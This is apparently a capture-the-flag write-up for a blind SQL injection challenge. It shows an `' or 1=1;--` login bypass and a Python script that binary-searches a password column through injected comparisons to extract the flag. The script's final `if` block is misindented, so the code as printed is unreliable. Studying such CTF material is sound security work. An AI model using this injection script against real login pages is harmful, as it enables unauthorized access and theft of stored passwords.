# Blind sql

We have a login page which tells us whether we successfully logged in. A quick test with the `uname` parameter as `' or 1=1;--` shows that the page is vulnerable to SQL injection. Since there's no flag even if we login successfully, the flag may lie in the password. Thus, we just need to send queries that gives us information about the password (`psw` parameter) based on whether we login successfully.

The way to do this with the least queries is to binary search for the password, as shown in the Python script below:

```python
import requests as req

url = 'http://130.185.122.155:8080/login'
cookies = { '416c6c6f77': '54727565' }


data = {
    'uname': "' or 1=1;--",
    'psw': "password"
}
success_text = req.post(url, cookies=cookies, data=data).text
data = {
    'uname': "' or 1=1;-",
    'psw': "password"
}
fail_text = req.post(url, cookies=cookies, data=data).text


current_password = 'RaziCTF{'
char_set = ''.join(sorted('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$^&*()[]-=+;:,./<>?'))

while True:
    lo, hi, ans = 0, len(char_set)-1, -1
    while lo <= hi:
        mid = (lo + hi) // 2
        next_char = char_set[mid]
        
        data = {
            'uname': "' or password>='" + current_password + next_char + "';--",
            'psw': "password"
        }
        res = req.post(url, cookies=cookies, data=data)
        if res.text == success_text:
            ans = mid
            lo = mid + 1
        else:
            hi = mid - 1
    current_password += char_set[ans]
		if current_password[-1] == '}':
		    break

# output the flag
print(current_password)
```
